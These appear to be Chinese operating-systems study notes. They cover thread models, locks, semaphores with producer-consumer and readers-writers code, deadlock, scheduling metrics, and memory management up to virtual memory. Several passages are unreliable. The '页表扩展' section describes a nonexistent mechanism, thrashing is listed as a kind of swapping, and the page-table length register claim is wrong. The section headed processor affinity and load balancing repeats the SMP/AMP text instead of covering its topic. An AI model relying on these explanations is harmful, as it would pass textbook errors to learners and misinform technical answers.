多对多模型是指多个用户线程对应多个内核线程，多个用户线程通过库函数或者系统调用来访问相应的内核线程，内核线程负责调度和管理对应的用户线程。多对多模型的优点是可以充分利用多核CPU的性能优势，同时可以灵活地创建、销毁和调度线程，但是由于需要维护多个用户线程和内核线程之间的映射关系，实现较为复杂。\n总的来说，多对一模型、一对一模型和多对多模型都是操作系统中常见的线程模型，它们各自具有优点和缺点，需要根据具体的应用场景来选择合适的线程模型。如果需要实现简单、轻量级的线程，可以选择多对一模型；如果需要实现高并发、高性能的线程，可以选择一对一模型或者多对多模型。在实际应用中，通常需要综合考虑线程模型的优缺点、应用场景和性能等因素，选择合适的线程模型。\n临界区问题，互斥、同步、有限等待 临界区问题是指多个进程或者线程同时访问共享资源时可能引发的问题，例如数据竞争、死锁等。为了解决临界区问题，可以采用互斥、同步和有限等待等技术。\n互斥 互斥是指在临界区内部对共享资源进行加锁，只有获得锁的进程或者线程才能访问共享资源，其他进程或者线程需要等待锁的释放。互斥可以避免多个进程或者线程同时访问共享资源的问题，从而避免数据竞争和其他相关问题。\n同步 同步是指在多个进程或者线程之间进行协调，以确保它们按照一定的顺序执行。同步可以避免多个进程或者线程之间的资源竞争和死锁问题，从而保证程序的正确性和稳定性。常见的同步技术包括信号量、条件变量、屏障等。\n有限等待 有限等待是指在多个进程或者线程之间进行协调，以确保它们在等待资源时不会无限期地等待。有限等待可以避免死锁问题，从而提高程序的可靠性。常见的有限等待技术包括超时机制、资源预分配等。\n总的来说，互斥、同步和有限等待是解决临界区问题的常见技术。在实际应用中，需要根据具体的应用场景和性能要求综合考虑选择合适的技术。\n非抢占式内核与抢占式内核 非抢占式内核和抢占式内核是操作系统内核的两种调度方式，它们在调度策略、性能等方面有一些区别。\n非抢占式内核 非抢占式内核是指内核不会主动剥夺正在运行中的进程或者线程的CPU时间片，除非它们主动放弃CPU或者发生阻塞等特殊情况。在非抢占式内核中，进程或者线程可以长时间占用CPU，从而可能导致其他进程或者线程无法及时得到CPU时间片，进而影响系统的响应性和吞吐量。\n抢占式内核 抢占式内核是指内核具有主动剥夺正在运行中的进程或者线程的CPU时间片的能力，以便及时地调度其他进程或者线程。在抢占式内核中，内核可以根据一定的调度策略主动剥夺正在运行中的进程或者线程的CPU时间片，以便让其他进程或者线程能够及时得到CPU时间片，提高系统的响应性和吞吐量。\n总的来说，非抢占式内核和抢占式内核都是操作系统内核的调度方式，它们各自具有优点和缺点，需要根据具体的应用场景来选择合适的调度方式。如果需要实现高性能、高吞吐量的系统，可以选择抢占式内核；如果需要实现稳定、可靠的系统，可以选择非抢占式内核。在实际应用中，通常需要综合考虑内核的调度策略、性能和稳定性等因素，选择合适的内核调度方式。\n互斥锁与自旋锁 互斥锁和自旋锁都是多线程编程中常用的同步技术，它们的主要区别在于实现方式和性能等方面。\n互斥锁 互斥锁是一种同步机制，它可以用来保护共享资源，避免多个线程同时访问和修改共享资源。在使用互斥锁的时候，线程需要先申请锁，如果锁已经被其他线程占用，则线程需要等待锁的释放。互斥锁的实现通常依赖于操作系统提供的原子操作和系统调用，可以保证并发访问共享资源的正确性和可靠性，但是在高并发的情况下，互斥锁的性能可能较低。\n自旋锁 自旋锁是一种特殊的互斥锁，它在等待锁的时候不会进行阻塞，而是通过循环等待的方式来尝试获取锁。如果锁已经被其他线程占用，则当前线程会一直循环等待，直到锁被释放或者超时。自旋锁的实现通常依赖于硬件提供的原子操作，可以避免线程的上下文切换和阻塞，从而提高并发访问共享资源的性能。但是在高并发和长时间等待的情况下，自旋锁的性能可能会下降。\n总的来说，互斥锁和自旋锁都是多线程编程中常用的同步技术，它们各自具有优点和缺点，需要根据具体的应用场景来选择合适的同步技术。如果需要保证并发访问共享资源的正确性和可靠性，可以选择互斥锁；如果需要提高并发访问共享资源的性能，可以选择自旋锁。在实际应用中，通常需要综合考虑同步技术的性能、正确性和可靠性等因素，选择合适的同步技术。\n信号量 信号量是一种用于同步和互斥的机制，可以用来控制多个进程或线程对共享资源的访问。\n二进制信号量 二进制信号量是一种最简单的信号量，它只有两个取值：0和1。当二进制信号量的值为0时，表示资源已经被占用，需要等待；当二进制信号量的值为1时，表示资源没有被占用，可以访问。二进制信号量通常用于实现互斥操作，即只允许一个进程或线程访问共享资源。\n计数信号量 计数信号量是一种可以取多个值的信号量，它的值可以大于等于0。当计数信号量的值为0时，表示资源已经被占用，需要等待；当计数信号量的值大于0时，表示资源没有被占用，可以访问。计数信号量通常用于实现多个进程或线程同时访问共享资源，例如线程池中的任务队列。\n总的来说，信号量是一种常用的同步和互斥机制，可以用于控制多个进程或线程对共享资源的访问。二进制信号量适用于实现互斥操作，计数信号量适用于实现多个进程或线程同时访问共享资源。在实际应用中，通常需要根据具体的应用场景和需求来选择合适的信号量类型。\n优先级反转与优先级继承协议 优先级反转和优先级继承协议是多线程编程中用于解决优先级倒置问题的技术。\n优先级反转 优先级反转是指一个低优先级的线程持有了一个高优先级的线程需要的资源，从而导致高优先级的线程被阻塞，无法及时得到CPU时间片。为了避免优先级反转问题，可以采用抢占式调度或者优先级继承协议。\n优先级继承协议 优先级继承协议是指当一个低优先级的线程持有了一个高优先级的线程需要的资源时，系统会将低优先级的线程的优先级提升到需要该资源的最高优先级线程的优先级，以便高优先级线程能够及时得到CPU时间片，避免优先级反转问题。当低优先级的线程释放了资源后，它的优先级会恢复到原来的值。\n总的来说，优先级反转和优先级继承协议是多线程编程中用于解决优先级倒置问题的技术。采用优先级继承协议可以避免优先级反转问题，提高系统的可靠性和稳定性。在实际应用中，需要根据具体的应用场景和性能要求综合考虑选择合适的技术。\n生产者-消费者，读者-写者 wait和signal原语可以用来实现信号量，进而解决生产者-消费者问题和读者写者问题。\n生产者-消费者问题 生产者-消费者问题是指多个生产者和消费者共享一个缓冲区。为了避免生产者在缓冲区已满时继续生产，或者消费者在缓冲区为空时继续消费，可以使用两个信号量实现：一个表示缓冲区中空余的数量，一个表示缓冲区中已有物品的数量。\n下面是使用wait和signal原语实现生产者-消费者问题的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // 缓冲区结构体 struct buffer { int data[MAX_SIZE]; int head; int tail; semaphore_t mutex; // 互斥信号量 semaphore_t empty; // 空缓冲区信号量 semaphore_t full; // 满缓冲区信号量 }; // 生产者线程 void *producer(void *arg) { buffer *buf = (buffer *)arg; while (true) { int item = produce_item(); sem_wait(\u0026amp;buf-\u0026gt;empty); sem_wait(\u0026amp;buf-\u0026gt;mutex); buf-\u0026gt;data[buf-\u0026gt;tail] = item; buf-\u0026gt;tail = (buf-\u0026gt;tail + 1) % MAX_SIZE; sem_signal(\u0026amp;buf-\u0026gt;mutex); sem_signal(\u0026amp;buf-\u0026gt;full); } } // 消费者线程 void *consumer(void *arg) { buffer *buf = (buffer *)arg; while (true) { sem_wait(\u0026amp;buf-\u0026gt;full); sem_wait(\u0026amp;buf-\u0026gt;mutex); int item = buf-\u0026gt;data[buf-\u0026gt;head]; buf-\u0026gt;head = (buf-\u0026gt;head + 1) % MAX_SIZE; sem_signal(\u0026amp;buf-\u0026gt;mutex); sem_signal(\u0026amp;buf-\u0026gt;empty); consume_item(item); } } 在上面的代码中，我们定义了一个缓冲区结构体，包含一个数组data来存储物品，头指针head和尾指针tail来指示缓冲区的状态，以及三个信号量：互斥信号量mutex、空缓冲区信号量empty和满缓冲区信号量full。在生产者线程中，我们先生产物品，然后等待空缓冲区信号量empty和互斥信号量mutex，如果缓冲区已经满了，则等待；如果有其他线程正在访问缓冲区，则等待。如果可以进入缓冲区，则将物品存入缓冲区，并更新尾指针tail。最后发送互斥信号量mutex和满缓冲区信号量full，表示缓冲区中已经有物品了。在消费者线程中，我们先等待满缓冲区信号量full和互斥信号量mutex，如果缓冲区为空，则等待；如果有其他线程正在访问缓冲区，则等待。如果可以从缓冲区中取出物品，则更新头指针head，并将空缓冲区信号量empty和互斥信号量mutex发送出去，表示缓冲区中有空闲位置了。最后消费物品。\n读者-写者问题 读者-写者问题是指多个读者和一个写者共享一个资源，读者可以同时读取资源，但是一次只能有一个写者修改资源。为了避免写者被多个读者同时访问，可以使用两个信号量实现：一个表示读者数量的信号量，一个表示写者数量的信号量。\n下面是使用wait和signal原语实现读者-写者问题的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // 数据结构 struct data { int value; semaphore_t mutex; // 互斥信号量 semaphore_t wrt; // 写者信号量 int readcnt; // 读者数量 }; // 读者线程 void *reader(void *arg) { data *d = (data *)arg; while (true) { sem_wait(\u0026amp;d-\u0026gt;mutex); // 进入临界区 d-\u0026gt;readcnt++; if (d-\u0026gt;readcnt == 1) { // 如果是第一个读者 sem_wait(\u0026amp;d-\u0026gt;wrt); // 阻塞写者 } sem_signal(\u0026amp;d-\u0026gt;mutex); // 离开临界区 // 读取数据 read_data(d-\u0026gt;value); sem_wait(\u0026amp;d-\u0026gt;mutex); // 进入临界区 d-\u0026gt;readcnt--; if (d-\u0026gt;readcnt == 0) { // 如果是最后一个读者 sem_signal(\u0026amp;d-\u0026gt;wrt); // 释放写者 } sem_signal(\u0026amp;d-\u0026gt;mutex); // 离开临界区 } } // 写者线程 void *writer(void *arg) { data *d = (data *)arg; while (true) { sem_wait(\u0026amp;d-\u0026gt;wrt); // 阻塞其他写者和读者 // 写入数据 write_data(d-\u0026gt;value); sem_signal(\u0026amp;d-\u0026gt;wrt); // 释放其他写者和读者 } } 在上面的代码中，我们定义了一个数据结构，包含一个整型value表示共享的数据，一个互斥信号量mutex用于保护数据的访问，一个写者信号量wrt用于阻塞写者和读者，以及一个整型readcnt表示读者数量。在读者线程中，我们先进入临界区，将读者数量加1，并判断是否是第一个读者，如果是，则阻塞写者。然后读取数据，并离开临界区。最后再次进入临界区，将读者数量减1，并判断是否是最后一个读者，如果是，则释放写者。在写者线程中，我们先阻塞其他写者和读者，然后写入数据，并释放其他写者和读者。\n总的来说，wait和signal原语可以用来实现信号量，进而解决生产者-消费者问题和读者写者问题。在实际应用中，需要根据具体的需求和操作系统的支持来选择合适的信号量实现方式。\n什么是CPU利用率、吞吐量、周转时间、等待时间、响应时间 CPU利用率、吞吐量、周转时间、等待时间和响应时间是计算机系统中常用的性能指标，它们分别表示不同方面的系统性能。\nCPU利用率 CPU利用率是指CPU在某个时间段内处于工作状态的时间占总时间的比例，通常用百分比表示。CPU利用率越高，表示CPU被充分利用的程度越高，系统的性能也越好。但是，如果CPU利用率过高，可能会导致系统响应变慢，甚至出现死机等问题。\n吞吐量 吞吐量是指在某个时间段内系统完成的任务数量，通常用每秒完成的任务数表示。吞吐量越高，表示系统的处理能力越强，可以同时处理更多的任务。但是，如果系统过度追求吞吐量，可能会导致任务响应时间变慢，用户体验变差。\n周转时间 周转时间是指从提交一个任务到完成该任务所需的时间，包括等待时间和执行时间。周转时间越短，表示任务的响应速度越快，用户体验越好。但是，如果系统中存在大量的等待时间，可能会导致周转时间变长，用户体验变差。\n等待时间 等待时间是指任务在系统中等待被执行的时间。等待时间越短，表示任务的响应速度越快，用户体验越好。但是，如果系统中存在大量的等待时间，可能会导致任务响应时间变长，用户体验变差。\n响应时间 响应时间是指任务从提交到开始执行的时间间隔，即用户等待任务开始执行的时间。响应时间越短，表示用户等待的时间越短，用户体验越好。但是，如果系统中存在大量的等待时间，可能会导致响应时间变长，用户体验变差。\n总的来说，CPU利用率、吞吐量、周转时间、等待时间和响应时间是计算机系统中常用的性能指标，可以用来评估系统的性能和优化系统的性能。不同的指标适用于不同的场景，需要根据具体的需求和应用场景来选择合适的指标。\n多处理器调度 非对称多处理与对称多处理 优缺点 多处理器调度是指在多处理器系统中，对多个进程或线程进行任务调度，使得多个处理器可以协同工作，提高系统的性能和吞吐量。多处理器系统可以分为对称多处理（Symmetric Multiprocessing，SMP）和非对称多处理（Asymmetric Multiprocessing，AMP）两种类型。\n对称多处理（SMP） 对称多处理是指多个处理器共享同一物理内存，并且可以相互访问和操作系统资源。在对称多处理系统中，所有的处理器都具有相同的地位，每个处理器都可以执行任何任务，任务的分配和调度由操作系统自动完成。对称多处理系统的优点是易于扩展和管理，处理器之间的通信和协调简单，可以充分利用系统的资源。但是，对称多处理系统的缺点是存在竞争和冲突，需要采用锁和同步机制来避免数据的竞争和冲突，处理器之间的通信和同步可能会影响系统的性能。\n非对称多处理（AMP） 非对称多处理是指多个处理器分别运行不同的任务，并且各自拥有独立的资源和内存空间。在非对称多处理系统中，每个处理器具有不同的地位和功能，它们之间可能存在主从关系或者协作关系。任务的分配和调度通常由应用程序或者用户手动完成。非对称多处理系统的优点是可以充分利用各个处理器的特性和优势，可以提高系统的可靠性和容错性。但是，非对称多处理系统的缺点是存在任务负载不均衡和资源浪费的问题，需要进行精细的任务分配和调度。\n综上所述，对称多处理和非对称多处理各有优缺点，需要根据具体的需求和应用场景来选择合适的多处理器系统。对称多处理适用于需要充分利用系统资源和提高系统性能的场景，非对称多处理适用于需要提高系统的可靠性和容错性的场景。\n处理器亲和性 负载均衡 多处理器调度是指在多处理器系统中，对多个进程或线程进行任务调度，使得多个处理器可以协同工作，提高系统的性能和吞吐量。多处理器系统可以分为对称多处理（Symmetric Multiprocessing，SMP）和非对称多处理（Asymmetric Multiprocessing，AMP）两种类型。\n对称多处理（SMP） 对称多处理是指多个处理器共享同一物理内存，并且可以相互访问和操作系统资源。在对称多处理系统中，所有的处理器都具有相同的地位，每个处理器都可以执行任何任务，任务的分配和调度由操作系统自动完成。对称多处理系统的优点是易于扩展和管理，处理器之间的通信和协调简单，可以充分利用系统的资源。但是，对称多处理系统的缺点是存在竞争和冲突，需要采用锁和同步机制来避免数据的竞争和冲突，处理器之间的通信和同步可能会影响系统的性能。\n非对称多处理（AMP） 非对称多处理是指多个处理器分别运行不同的任务，并且各自拥有独立的资源和内存空间。在非对称多处理系统中，每个处理器具有不同的地位和功能，它们之间可能存在主从关系或者协作关系。任务的分配和调度通常由应用程序或者用户手动完成。非对称多处理系统的优点是可以充分利用各个处理器的特性和优势，可以提高系统的可靠性和容错性。但是，非对称多处理系统的缺点是存在任务负载不均衡和资源浪费的问题，需要进行精细的任务分配和调度。\n综上所述，对称多处理和非对称多处理各有优缺点，需要根据具体的需求和应用场景来选择合适的多处理器系统。对称多处理适用于需要充分利用系统资源和提高系统性能的场景，非对称多处理适用于需要提高系统的可靠性和容错性的场景。\n死锁概念与死锁示例 死锁（Deadlock）是指在多个并发进程或线程之间，由于彼此互相等待对方释放资源而无法继续执行的一种状态。在死锁状态下，所有的进程或线程都被阻塞，无法进行任何操作，从而导致系统的停滞和崩溃。\n死锁通常由以下四个必要条件引起：\n互斥条件：一个资源一次只能被一个进程或线程占用。\n请求并持有条件：一个进程或线程占用了一个资源，同时又请求另一个被其它进程或线程占用的资源。\n不可抢占条件：一个进程或线程占用的资源不能被其它进程或线程抢占，只能由该进程或线程主动释放。\n循环等待条件：多个进程或线程之间存在一个资源的循环等待链，即每个进程或线程都在等待其它进程或线程持有的资源。\n以下是一个简单的死锁示例：\n假设有两个进程 A 和 B，它们需要占用两个资源 X 和 Y。进程 A 占用了资源 X，同时请求资源 Y，而进程 B 占用了资源 Y，同时请求资源 X。由于资源 X 和 Y 一次只能被一个进程占用，因此进程 A 和 B 都无法获得它们需要的资源，从而进入死锁状态。此时，进程 A 和 B 都无法继续执行，系统陷入停滞状态。\n为了避免死锁，通常可以采用以下几种方法：\n破坏互斥条件：可以将某些资源设计为可共享的，从而避免资源的独占。\n破坏请求并持有条件：可以要求进程在请求资源之前先释放已经占用的资源。\n破坏不可抢占条件：可以允许进程在必要时抢占其它进程的资源。\n破坏循环等待条件：可以规定所有的资源按相同的顺序请求，从而避免循环等待链的出现。\n以上方法可以单独或者组合使用，以避免死锁的发生。\n使用资源分配图检测死锁 资源分配图是一种用于描述多个进程或线程之间资源占用和请求关系的图形表示方法，可以用于死锁检测和避免。\n使用资源分配图进行死锁检测的一般步骤如下：\n绘制进程和资源的节点：将每个进程和资源分别用节点表示，并用箭头表示进程对资源的请求和占用关系。\n绘制资源分配边和请求边：将进程对资源的请求和占用关系分别用资源分配边和请求边表示。\n检测循环等待：检查资源分配图中是否存在循环等待链，即是否存在一个进程和资源的闭合环路。如果存在循环等待链，则说明可能存在死锁。\n分析死锁：如果存在循环等待链，则需要进行死锁的分析和处理。通常可以采用资源抢占或者资源回收等方法解除死锁状态。\n以下是一个简单的资源分配图：\n1 2 3 P1 P2 / \\ / \\ R1 R2 R2 R1 在上述资源分配图中，进程 P1 占用了资源 R1，同时请求资源 R2；进程 P2 占用了资源 R2，同时请求资源 R1。由于需要互斥使用资源 R1 和 R2，进程 P1 和 P2 之间存在循环等待链，因此可能存在死锁。\n通过资源分配图进行死锁检测可以帮助我们识别潜在的死锁问题，并采取相应的预防措施。\n死锁的处理方法 死锁是多进程或多线程并发执行时可能出现的一种严重问题。当多个进程或线程相互等待对方释放所占用的资源时，就会出现死锁的情况。为了解决死锁问题，可以采用以下几种方法：\n预防死锁 预防死锁是指在设计和实现系统时，通过破坏死锁必要条件来预防死锁的发生。具体方法包括：破坏互斥条件、破坏请求并持有条件、破坏不可抢占条件和破坏循环等待条件等。\n避免死锁 避免死锁是指在运行时避免死锁的发生。具体方法包括：银行家算法、资源分配图算法等。这些算法在资源分配的过程中，通过动态地判断是否会出现死锁，来避免死锁的发生。\n检测和恢复死锁 检测和恢复死锁是指在出现死锁后，通过检测死锁的状态和位置，并采取相应的措施来解除死锁。具体方法包括：死锁检测算法和死锁解除算法等。在检测到死锁后，可以采用资源抢占或者资源回收等方法来解除死锁状态。\n放弃死锁 放弃死锁是指通过终止进程或线程来解除死锁。这种方法虽然能够快速解除死锁，但是会造成资源浪费和进程中断等问题。\n综上所述，预防死锁和避免死锁是最好的解决死锁问题的方法，其次是检测和恢复死锁，最后是放弃死锁。在实际应用中，应该根据具体的情况选择合适的处理方法。\n安全状态、不安全状态、死锁状态 安全状态（Safe state）是指在当前系统状态下，所有进程都能够按照其所需的资源顺利执行完毕，并最终释放所占用的资源，而不会发生死锁。\n不安全状态（Unsafe state）是指在当前系统状态下，至少存在一种进程请求资源的顺序，可以导致死锁的发生。也就是说，如果当前系统状态是不安全状态，那么就存在一定的概率会发生死锁。\n死锁状态（Deadlock state）是指在多个进程或线程之间，由于彼此互相等待对方释放资源而无法继续执行的一种状态。在死锁状态下，所有的进程或线程都被阻塞，无法进行任何操作，从而导致系统的停滞和崩溃。\n在多进程或多线程并发执行的情况下，系统状态可能会从安全状态变为不安全状态，从不安全状态变为死锁状态。因此，为了避免死锁的发生，需要在系统运行中及时检测和处理不安全状态，并尽可能地保持系统在安全状态下运行。\n内存保护 内存保护是一种操作系统提供的重要机制，用于保护不同进程之间以及进程与操作系统内核之间的内存空间，防止它们相互干扰或者非法访问。\n在现代操作系统中，通常采用以下几种方式实现内存保护：\n虚拟内存机制：虚拟内存机制将物理内存空间映射到虚拟地址空间上，从而使每个进程拥有独立的虚拟地址空间。通过使用页表等数据结构，操作系统可以控制进程对虚拟地址空间的访问权限，以保护进程之间的内存空间。\n进程间通信（IPC）机制：进程间通信机制允许不同进程之间进行数据交换和共享，但是必须保证数据传输的安全性。常见的进程间通信机制包括共享内存、消息队列、管道等，这些机制通常由操作系统提供，并且通过各种权限和访问控制机制来保证通信的安全性。\n用户模式和内核模式：现代操作系统通常将内核和用户空间分离，通过硬件机制（如特权级别）来区分用户模式和内核模式。在用户模式下，进程只能访问自己的虚拟地址空间；而在内核模式下，操作系统可以访问所有进程的虚拟地址空间，从而保护进程和内核之间的内存空间。\n总之，内存保护是操作系统中非常重要的机制之一，它可以保护不同进程之间以及进程与操作系统内核之间的内存空间，防止它们相互干扰或者非法访问，保证系统的稳定和安全。\n内存地址绑定 内存地址绑定是指将程序中的符号地址绑定到内存中的实际物理地址的过程。在传统的操作系统中，内存地址绑定通常分为三个阶段：编译时间绑定、加载时间绑定和运行时绑定，而这些阶段的耗时也不同：\n编译时间绑定：在编译程序时，将程序中的符号地址转换为相应的绝对地址。这种绑定方法的优点是程序运行时不需要进行地址转换，因此可以提高程序运行的效率。但是缺点是程序运行时只能在固定的内存地址上运行，无法适应不同的内存布局和动态加载的情况。\n加载时间绑定：程序在加载到内存时，将程序中的符号地址转换为相应的内存地址。这种绑定方法的优点是可以适应不同的内存布局和动态加载的情况，但是缺点是程序运行时需要进行地址转换，会影响程序的运行效率。\n运行时绑定：程序在运行时，动态地将符号地址绑定到相应的内存地址。这种绑定方法的优点是可以适应动态加载和动态链接的情况，但是缺点是需要在程序运行时进行地址转换，会影响程序的运行效率。\n总的来说，编译时间绑定是最快的，但是缺乏灵活性；运行时绑定最灵活，但是速度最慢；加载时间绑定则是一种折中的方案，可以在灵活性和速度之间做出平衡。在实际应用中，应该选择合适的绑定方法，以满足程序的需求。\n空闲存储分配，首次适应，最佳适应，最差适应 空闲存储分配是指在操作系统中，为进程分配内存空间时，从系统中的空闲内存区域中选择一个合适的内存块分配给进程。常见的空闲存储分配算法包括首次适应算法、最佳适应算法和最差适应算法。\n首次适应算法（First Fit）：首次适应算法是一种简单的空闲存储分配算法。它从内存空闲区域的开始处开始查找，找到第一个能够满足进程需要的空闲块，并将其分配给进程。由于首次适应算法的查找速度较快，因此在空闲块较少的情况下，它的性能比较好。\n最佳适应算法（Best Fit）：最佳适应算法是一种选择最小合适内存块的空闲存储分配算法。它从所有空闲块中找到大小最合适的那个块，将其分配给进程。由于最佳适应算法需要遍历所有空闲块，因此它的性能比较低，但是它能够有效地利用存储空间。\n最差适应算法（Worst Fit）：最差适应算法是一种选择最大合适内存块的空闲存储分配算法。它从所有空闲块中找到大小最大的那个块，将其分配给进程。由于最差适应算法分配的块通常比较大，因此它能够减少外部碎片的产生。但是，最差适应算法也需要遍历所有空闲块，因此它的性能也比较低。\n综上所述，不同的空闲存储分配算法各有优缺点，应根据实际情况选择合适的算法。如果系统中的空闲内存块较少，首次适应算法的性能比较好；如果要减少外部碎片的产生，可以选择最差适应算法；如果要有效地利用存储空间，可以选择最佳适应算法。\n内部碎片，外部碎片 在操作系统中，内部碎片和外部碎片都是指在内存管理中出现的空闲内存块浪费的情况。\n内部碎片是指在分配内存时，由于内存块大小不是恰好满足进程的需求，而导致内存块中存在未被利用的空间。例如，如果一个进程需要申请10KB的内存空间，但是系统只有一块12KB的空闲内存，那么如果将这个12KB的内存分配给该进程，就会有2KB的空间无法被利用，这就是内部碎片。\n外部碎片是指在内存管理中，由于内存中的空闲内存块大小不连续或者不足以满足进程的需求，而导致无法分配所需要的连续内存空间的情况。例如，如果有两个空闲内存块分别为4KB和6KB，而进程需要申请8KB的连续内存空间，那么无论如何，都无法满足进程的要求。这就是外部碎片。\n内部碎片和外部碎片都会导致内存空间的浪费，但是它们的产生原因和解决方法不同。对于内部碎片，可以采用动态分区分配的方法，即在内存中分配刚好满足进程需求的内存块，从而减少内部碎片的产生。而对于外部碎片，可以采用紧凑操作的方法，即将内存中的空闲内存块进行整理和合并，从而获得足够的连续空间，以满足进程的需求。\n内存交换，标准交换 内存交换是指将内存中的一部分数据暂时保存到磁盘中，以便腾出内存空间供其他程序使用。常见的内存交换技术包括页面交换和页面抖动。\n页面交换是指将内存中的一页数据保存到磁盘中，以便在需要时再将其加载回内存。页面交换通常是由操作系统自动完成的，当内存紧张时，操作系统会将一部分页面换出到磁盘中，以便为其他程序腾出空间。当需要访问被换出的页面时，操作系统会将其从磁盘中加载回内存。\n页面抖动是指当系统内存空间不足时，操作系统反复地将某些页面从内存中换出到磁盘中，然后又将其换入内存，这种过程会反复循环，导致系统的响应速度变慢。为了避免页面抖动，可以通过增加内存或者减少系统负载来缓解内存压力。\n标准交换是一种在早期的操作系统中使用的内存交换技术。它将整个进程从内存中移出，然后再将其移回内存。标准交换的缺点是它需要移动整个进程，因此速度较慢，而且需要处理大量的磁盘I/O操作。由于现代操作系统已经采用了更加先进的页面交换技术，因此标准交换已经很少被使用。\n总之，内存交换是一种重要的内存管理技术，它可以在内存空间不足时，将部分数据暂时保存到磁盘中，以便为其他程序腾出空间。在实际应用中，应该根据系统的实际情况选择合适的内存交换技术，以满足系统的需求。\n内存性能 页表扩展 内存性能是指在计算机系统中访问内存的速度和效率。TLB和页表扩展是提高内存访问性能的两种技术。\nTLB（Translation Lookaside Buffer）是一种高速缓存，用于加速虚拟地址到物理地址的转换。在计算机系统中，CPU通过虚拟地址来访问内存，而虚拟地址需要通过页表进行转换才能得到物理地址。由于页表通常比较大，因此每次访问都需要遍历整个页表，这会导致访问速度变慢。TLB作为一种高速缓存，用于保存最近访问的页表项，从而加速虚拟地址到物理地址的转换。当CPU访问一个虚拟地址时，首先会在TLB中查找对应的页表项，如果找到了，就可以直接得到物理地址。如果没有找到，则需要遍历整个页表来查找对应的页表项。TLB的命中率越高，访问速度就越快。\n页表扩展是一种将物理地址分配给多个虚拟地址的技术。在传统的页表中，每个虚拟地址对应一个物理地址，因此当物理内存不足时，就必须使用内存交换技术来腾出空间。而页表扩展技术可以将多个虚拟地址映射到同一个物理地址上，从而减少物理内存的使用量。当物理内存不足时，系统可以将某些页表项换出到磁盘中，从而腾出更多的空间。页表扩展技术可以有效地提高内存的使用效率和性能。\n综上所述，TLB和页表扩展都是提高内存访问性能的重要技术。TLB通过加速虚拟地址到物理地址的转换，提高了内存访问的速度；而页表扩展通过减少物理内存的使用量，提高了内存的使用效率。在实际应用中，应该根据系统的实际情况选择合适的技术，以满足系统的需求。\n页表扩展是一种将物理地址分配给多个虚拟地址的技术，它可以有效地提高内存的使用效率和性能。\n在页表扩展中，每个页表项通常包含以下几个字段：\n物理地址：用于指定虚拟地址对应的物理地址。\n权限位：用于指定虚拟地址对应的物理地址的访问权限，包括读、写、执行等权限。\n有效位：用于指示该页表项是否有效。如果有效位为1，则说明该页表项对应的虚拟地址是有效的，否则为无效的。\n其他字段：不同的操作系统可能会在页表项中加入一些其他的字段，用于实现不同的功能，例如存储缓存标记等。\n在实际应用中，操作系统通常会使用页表长度寄存器来记录页表的长度。页表长度寄存器是一个特殊的寄存器，用于存储页表的长度。当CPU访问虚拟地址时，它会根据页表长度寄存器来确定页表的大小，从而确定需要遍历的页表项的数量。如果页表长度寄存器的值发生改变，操作系统需要重新构建页表。\n总之，页表扩展是一种重要的内存管理技术，它可以将物理地址分配给多个虚拟地址，从而提高了内存的使用效率和性能。在实现页表扩展时，需要使用权限位和有效位来保证内存访问的正确性，并使用页表长度寄存器来记录页表的长度，以便CPU能够正确地访问内存。\n页表实现 页表是一种数据结构，用于将虚拟地址映射到物理地址。在计算机系统中，页表的实现方式可以分为分层分页、哈希页表和反置页表三种。\n分层分页：分层分页是一种将页表分为多个层次的技术。在分层分页中，页表被分为多个层次，每个层次包含多个页表项。当CPU访问一个虚拟地址时，系统会按照层次结构遍历页表，直到找到对应的物理地址。分层分页的优点是可以减少页表的大小，从而提高访问速度，但是也会增加访问的复杂度。\n哈希页表：哈希页表是一种使用哈希表实现的页表。在哈希页表中，虚拟地址被映射到哈希表的某个位置上，而每个哈希表项则包含一个虚拟地址和对应的物理地址。当CPU访问一个虚拟地址时，系统会使用哈希函数计算该虚拟地址对应的哈希表项的位置，从而得到对应的物理地址。哈希页表的优点是可以减少页表的大小，从而提高访问速度，但是也会增加哈希冲突的可能性。\n反置页表：反置页表是一种将物理地址映射到虚拟地址的页表。在反置页表中，每个页表项包含一个物理地址和对应的虚拟地址。当CPU访问一个虚拟地址时，系统会在反置页表中查找对应的物理地址。反置页表的优点是可以减少页表的大小，从而提高访问速度，但是也会增加访问物理地址的复杂度。\n总之，页表是一种重要的内存管理技术，它可以将虚拟地址映射到物理地址，从而实现内存的管理和访问。在实现页表时，可以采用不同的实现方式，例如分层分页、哈希页表和反置页表等，以满足系统的需求。\n虚拟内存 程序局部性原则 虚拟内存是一种计算机系统中的内存管理技术，它允许将物理内存和磁盘空间组合使用，从而扩展了内存的容量。在虚拟内存中，操作系统将进程的虚拟地址空间映射到物理内存或磁盘空间中，从而实现了动态内存分配和地址空间隔离等功能。\n程序局部性原则是指程序在执行过程中，会倾向于重复访问一些特定的内存区域。程序局部性原则分为时间局部性和空间局部性两种：\n时间局部性：当程序访问一个内存地址时，它很可能在短时间内再次访问该地址，因此操作系统可以将该地址所在的页表项保留在高速缓存中，从而提高内存访问速度。\n空间局部性：当程序访问一个内存地址时，它很可能在短时间内访问该地址附近的其他地址，因此操作系统可以将该地址附近的页表项也保留在高速缓存中，从而进一步提高内存访问速度。\n程序局部性原则是虚拟内存实现的重要基础。虚拟内存可以将程序常用的内存页保留在物理内存中，而将不常用的内存页置换到磁盘中，从而充分利用程序局部性原则，提高内存访问速度和效率。\n总之，虚拟内存是一种重要的内存管理技术，它可以扩展内存的容量，提高内存的使用效率。程序局部性原则是虚拟内存实现的重要基础，它可以充分利用程序的访问规律，提高内存访问速度和效率。\n缺页中断与其处理方式 